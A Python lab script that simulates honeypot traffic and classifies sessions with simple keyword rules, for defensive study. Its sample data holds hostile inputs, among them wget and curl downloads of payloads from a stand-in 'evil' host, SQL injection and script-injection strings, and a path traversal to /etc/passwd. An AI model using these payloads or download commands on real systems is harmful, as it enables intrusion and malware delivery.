
import argparse
import csv
import random
from collections import Counter, defaultdict
from datetime import datetime, timedelta
from pathlib import Path

DATA_DIR = Path("data")


def generate_sessions(n=200):
    random.seed(42)
    DATA_DIR.mkdir(exist_ok=True)
    base_time = datetime(2025, 1, 1, 0, 0, 0)
    services = ["ssh", "http", "db"]

    brute_force_cmds = ["ssh root@target", "ssh admin@target", "AUTH password=123456", "AUTH password=admin"]
    scanner_paths = ["/", "/wp-login.php", "/phpmyadmin", "/.git/config", "/server-status"]
    exploit_payloads = ["UNION SELECT", "' OR 1=1 --", "<script>alert(1)</script>", "../etc/passwd"]
    malware_cmds = ["wget http://evil/payload.sh", "curl http://evil/malware.exe -o m.exe"]

    rows = []
    for i in range(n):
        session_id = f"s{i:04d}"
        src_ip = f"198.51.100.{random.randint(1, 254)}"
        svc = random.choice(services)
        t = base_time + timedelta(seconds=random.randint(0, 86400))

        kind = random.choices(
            ["scanner", "brute_force", "exploit_attempt", "malware_download"],
            weights=[0.4, 0.3, 0.2, 0.1],
        )[0]

        if kind == "scanner":
            raw_input = f"GET {random.choice(scanner_paths)} HTTP/1.1"
        elif kind == "brute_force":
            raw_input = random.choice(brute_force_cmds)
        elif kind == "exploit_attempt":
            raw_input = f"POST /login HTTP/1.1 body='{random.choice(exploit_payloads)}'"
        else:
            raw_input = random.choice(malware_cmds)

        rows.append({
            "session_id": session_id,
            "src_ip": src_ip,
            "service": svc,
            "raw_input": raw_input,
            "timestamp": t.isoformat(),
        })

    out_path = DATA_DIR / "honeypot_sessions.csv"
    with out_path.open("w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
        writer.writeheader()
        writer.writerows(rows)
    print(f"[info] Generated {len(rows)} honeypot sessions at {out_path}")


def classify_row(raw_input: str) -> str:
    lower = raw_input.lower()
    if "wget " in lower or "curl " in lower:
        return "malware_download"
    if "union select" in lower or "../etc/passwd" in lower or "<script>" in lower:
        return "exploit_attempt"
    if "auth password" in lower or "ssh " in lower:
        return "brute_force"
    if " get " in f" {lower} " or " http/" in lower:
        return "scanner"
    return "unknown"


def analyse_sessions():
    in_path = DATA_DIR / "honeypot_sessions.csv"
    if not in_path.is_file():
        raise SystemExit(f"Session file not found: {in_path} (run demo first)")

    with in_path.open("r", encoding="utf-8") as f:
        reader = csv.DictReader(f)
        rows = list(reader)

    labeled = []
    for r in rows:
        category = classify_row(r["raw_input"])
        r2 = dict(r)
        r2["category"] = category
        labeled.append(r2)

    out_path = DATA_DIR / "honeypot_sessions_labeled.csv"
    with out_path.open("w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=list(labeled[0].keys()))
        writer.writeheader()
        writer.writerows(labeled)
    print(f"[info] Labeled sessions written to {out_path}")

    counts = Counter(r["category"] for r in labeled)
    print("[info] Session counts by category:")
    for cat, c in counts.items():
        print(f"  {cat:18} {c}")

    top_ips_by_cat = defaultdict(Counter)
    for r in labeled:
        top_ips_by_cat[r["category"]][r["src_ip"]] += 1

    print("[info] Top source IPs per category:")
    for cat, ctr in top_ips_by_cat.items():
        print(f"  {cat}:")
        for ip, cnt in ctr.most_common(3):
            print(f"    {ip} ({cnt} sessions)")


def main():
    parser = argparse.ArgumentParser(description="Honeypot intelligence lab")
    parser.add_argument("mode", choices=["demo"], help="Run demo (generate + analyse)")
    args = parser.parse_args()

    if args.mode == "demo":
        generate_sessions()
        analyse_sessions()


if __name__ == "__main__":
    import argparse
    main()
